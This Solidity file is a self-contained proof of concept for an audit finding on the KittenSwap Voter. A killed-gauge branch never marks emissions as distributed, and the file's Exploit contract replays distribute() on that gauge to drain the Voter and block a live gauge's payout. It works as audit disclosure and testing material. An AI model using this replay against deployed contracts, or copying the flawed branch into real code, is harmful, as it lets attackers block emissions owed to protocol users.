// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of KittenSwap finding 61951 (H-01):
// "Repeated distributions for killed gauges can block valid distributions".
//
// Real audited source (closed-source KittenSwap / HyperEVM ve(3,3) DEX). The
// vulnerable `_distribute` body is reproduced VERBATIM from the finding's
// embedded ```solidity snippet; the vulnerable line is marked @>.
//   protocol KittenSwap_2025-07-31
//   contract Voter
//   fn       _distribute(uint256 _period, address _gauge)
//   report   github.com/pashov/audits .../KittenSwap-security-review_2025-07-31.md
//
// Root cause: when a gauge is killed (`isAlive == false`), `_distribute` routes
// that gauge's pending emissions back to the `minter` contract but NEVER sets
// `es.distributed = true` (only the live `else` branch does). The guard
// `if (es.distributed) revert EmissionsAlreadyDistributedForPeriod();` therefore
// never trips for a killed gauge, so an attacker can call `distribute(killedGauge)`
// repeatedly in the same period. Each replay drains another slice of the Voter's
// KITTEN back to the minter, until the Voter has no KITTEN left to fund the valid
// distributions of the other (live) gauges — those calls then revert.
//
// The finding notes that a killed *standard* gauge's `notifyRewardAmount(0)`
// reverts (so the replay only works on Algebra gauges, whose gauge accepts a zero
// notify because its rewards come from claimed pool fees). This double models that
// faithfully: the killed gauge here is an Algebra gauge that no-ops on a zero
// notify, and the blocked live gauge is a standard gauge that pulls its emissions
// via `transferFrom` (which reverts once the Voter is drained).
//
// All non-vulnerable dependencies (KITTEN token, Minter period funding, gauge
// reward pull, period/vote/pool bookkeeping) are faithful minimal doubles with
// real transfers and real accounting — the harm emerges from the verbatim code,
// it is not asserted.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

/// @dev Emissions record referenced by the verbatim line
///      `IVoter.Emissions storage es = ps.gaugeEmissions[_gauge];`.
interface IVoter {
    struct Emissions {
        uint256 amount;
        bool distributed;
    }
}

/// @dev Gauge reward sink referenced by `IGauge(_gauge).notifyRewardAmount(...)`.
interface IGauge {
    function notifyRewardAmount(uint256 amount) external;
}

/// @dev Faithful minimal ERC20 double for the KITTEN emissions token.
contract Kitten is IERC20 {
    string public name = "KittenSwap";
    string public symbol = "KITTEN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount; // reverts on insufficient balance (0.8 checked math)
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount; // reverts if the Voter has been drained
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Harm marker (DoS/griefing has no positive transfer to the attacker, so the
///      magnitude of valid emissions blocked/misrouted is minted to the SINK).
contract MarkerToken {
    string public name = "KittenSwap Blocked Emissions (harm marker)";
    string public symbol = "KITTEN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

/// @dev Faithful double of the Minter: it holds the period's total emissions and,
///      on the first `updatePeriod()` of a period, transfers them to the Voter
///      (idempotent for the rest of the period). Killed-gauge emissions routed back
///      by the Voter accumulate here.
contract Minter {
    IERC20 public kitten;
    address public voter;
    uint256 public periodTotal;
    uint256 public currentPeriod = 1;
    uint256 public lastFundedPeriod;

    constructor(IERC20 kitten_) {
        kitten = kitten_;
    }

    function configure(address voter_, uint256 periodTotal_) external {
        voter = voter_;
        periodTotal = periodTotal_;
    }

    /// @notice Fund the Voter with the period's total emissions, once per period.
    function updatePeriod() external {
        if (lastFundedPeriod < currentPeriod) {
            lastFundedPeriod = currentPeriod;
            kitten.transfer(voter, periodTotal);
        }
    }
}

/// @dev Faithful double of an Algebra gauge. It accepts a zero-amount notify
///      without reverting (its rewards are period-specific pool fees claimed
///      elsewhere), which is exactly why killed Algebra gauges can be re-distributed.
contract AlgebraGauge is IGauge {
    IERC20 public kitten;

    constructor(IERC20 kitten_) {
        kitten = kitten_;
    }

    function notifyRewardAmount(uint256 amount) external {
        if (amount > 0) kitten.transferFrom(msg.sender, address(this), amount);
    }
}

/// @dev Faithful double of a standard gauge. It pulls its emissions from the Voter
///      via `transferFrom`, which reverts once the Voter's KITTEN has been drained.
contract StandardGauge is IGauge {
    IERC20 public kitten;

    constructor(IERC20 kitten_) {
        kitten = kitten_;
    }

    function notifyRewardAmount(uint256 amount) external {
        require(amount > 0, "zero rewards"); // standard gauges reject zero notify
        kitten.transferFrom(msg.sender, address(this), amount);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `_distribute` is reproduced VERBATIM from the audited
// KittenSwap Voter (the finding's embedded snippet).
// ─────────────────────────────────────────────────────────────────────────────
contract Voter {
    struct GaugeInfo {
        bool isAlive;
        bool isAlgebra;
    }

    struct PeriodState {
        uint256 totalEmissions;
        uint256 globalTotalVotes;
        mapping(address => uint256) gaugeTotalVotes;
        mapping(address => IVoter.Emissions) gaugeEmissions;
    }

    IERC20 public kitten;
    Minter public minter;

    mapping(uint256 => PeriodState) internal periodState;
    mapping(address => GaugeInfo) public gauge; // keyed by pool
    mapping(address => address) public poolForGauge;
    uint256 public currentPeriod = 1;

    error EmissionsAlreadyDistributedForPeriod();

    constructor(IERC20 kitten_, Minter minter_) {
        kitten = kitten_;
        minter = minter_;
    }

    // ── faithful setup doubles (in production this state comes from voting/minter) ──
    function setupPeriod(uint256 period_, uint256 totalEmissions_, uint256 globalTotalVotes_) external {
        PeriodState storage ps = periodState[period_];
        ps.totalEmissions = totalEmissions_;
        ps.globalTotalVotes = globalTotalVotes_;
    }

    function registerGauge(
        uint256 period_,
        address _gauge,
        address _pool,
        uint256 votes_,
        bool isAlive_,
        bool isAlgebra_
    ) external {
        poolForGauge[_gauge] = _pool;
        gauge[_pool] = GaugeInfo({isAlive: isAlive_, isAlgebra: isAlgebra_});
        periodState[period_].gaugeTotalVotes[_gauge] = votes_;
    }

    /// @notice Public entrypoint: fund the Voter for the period (once) then distribute
    ///         the given gauge's emissions. Permissionless, exactly as audited.
    function distribute(address _gauge) external {
        minter.updatePeriod();
        _distribute(currentPeriod, _gauge);
    }

    // ── faithful double for the Algebra pool-fee claim (no KITTEN flow) ──
    function _claimAndDistributeAlgebraPoolFees(address /* _pool */) internal {}

    // ═══════════════ VERBATIM audited `_distribute` body ═══════════════
    function _distribute(uint256 _period, address _gauge) internal {
        PeriodState storage ps = periodState[_period];
        address _pool = poolForGauge[_gauge];

        IVoter.Emissions storage es = ps.gaugeEmissions[_gauge];
        if (es.distributed) revert EmissionsAlreadyDistributedForPeriod();

        uint256 emissions = (ps.totalEmissions * ps.gaugeTotalVotes[_gauge]) /
            ps.globalTotalVotes;

        if (gauge[_pool].isAlive == false) {
            kitten.transfer(address(minter), emissions); // @> VULN: killed branch routes emissions back to minter but never sets es.distributed=true, so distribute(killedGauge) can be replayed every call and drain the Voter
            emissions = 0;
        } else {
            es.amount = emissions;
            es.distributed = true;
        }

        if (gauge[_pool].isAlgebra) _claimAndDistributeAlgebraPoolFees(_pool);
        kitten.approve(_gauge, emissions);
        IGauge(_gauge).notifyRewardAmount(emissions);
    }
    // ═══════════════════════════════════════════════════════════════════
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: reproduce the finding's worked example. 100 KITTEN for the
// period, votes a=45 / b=45 / killed-algebra c=10. Attacker replays
// distribute(gauge_c) to drain the Voter back to the minter, then the valid
// distribution for the live gauge_a is blocked (reverts for lack of KITTEN).
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    Kitten public kitten;
    MarkerToken public marker;
    Minter public minter;
    Voter public voter;
    AlgebraGauge public gaugeC; // killed algebra gauge (the replay target)
    StandardGauge public gaugeA; // live standard gauge (its valid distribution is blocked)

    uint256 internal constant TOTAL_EMISSIONS = 100e18;
    uint256 internal constant VOTES_A = 45;
    uint256 internal constant VOTES_C = 10; // killed gauge share = 10e18 per call
    uint256 internal constant GLOBAL_VOTES = 100; // a(45) + b(45) + c(10)

    uint256 public improperlyDrained; // KITTEN misrouted back to minter via replays
    bool public validDistributionBlocked;
    uint256 public profit; // == improperlyDrained (blocked/misrouted magnitude)

    constructor() {
        kitten = new Kitten(); // child nonce 1
        marker = new MarkerToken(); // child nonce 2
        minter = new Minter(kitten); // child nonce 3
        voter = new Voter(kitten, minter); // child nonce 4 (VULN)
        gaugeC = new AlgebraGauge(kitten); // child nonce 5
        gaugeA = new StandardGauge(kitten); // child nonce 6

        // Minter holds the period's 100 KITTEN and funds the Voter on updatePeriod().
        minter.configure(address(voter), TOTAL_EMISSIONS);
        kitten.mint(address(minter), TOTAL_EMISSIONS);

        // Period 1 vote/gauge state (killed algebra gauge_c, live standard gauge_a).
        voter.setupPeriod(1, TOTAL_EMISSIONS, GLOBAL_VOTES);
        voter.registerGauge(1, address(gaugeC), address(0xC0), VOTES_C, false, true); // killed algebra
        voter.registerGauge(1, address(gaugeA), address(0xA0), VOTES_A, true, false); // live standard
    }

    function run() external {
        // 1) First distribute(gauge_c): minter funds the Voter with 100e18, then the
        //    killed branch routes gauge_c's 10e18 back to the minter (correct state).
        voter.distribute(address(gaugeC));
        uint256 voterAfterFirst = kitten.balanceOf(address(voter)); // == 90e18 (owed to a+b)

        // 2) Replay distribute(gauge_c) — the guard never trips (es.distributed unset),
        //    so each call drains another 10e18 from the Voter back to the minter.
        for (uint256 i = 0; i < 9; i++) {
            voter.distribute(address(gaugeC));
        }
        uint256 voterAfterDrain = kitten.balanceOf(address(voter)); // == 0
        improperlyDrained = voterAfterFirst - voterAfterDrain; // == 90e18

        // 3) A valid distribution for the live gauge_a now reverts: the Voter has no
        //    KITTEN left to fund the gauge's transferFrom pull.
        try voter.distribute(address(gaugeA)) {
            validDistributionBlocked = false;
        } catch {
            validDistributionBlocked = true;
        }

        // Concrete harm: the killed-gauge replay drained the exact emissions owed to
        // the live gauges (a+b = 90e18), permanently blocking their period-2 payout.
        require(improperlyDrained == 90e18, "killed-gauge replay did not drain the Voter");
        require(validDistributionBlocked, "valid distribution was not blocked");

        // DoS/griefing: no value reaches the attacker (KITTEN is routed to the minter,
        // a protocol contract). Record the blocked/misrouted magnitude at the SINK.
        marker.mint(SINK, improperlyDrained);
        profit = improperlyDrained;
    }
}
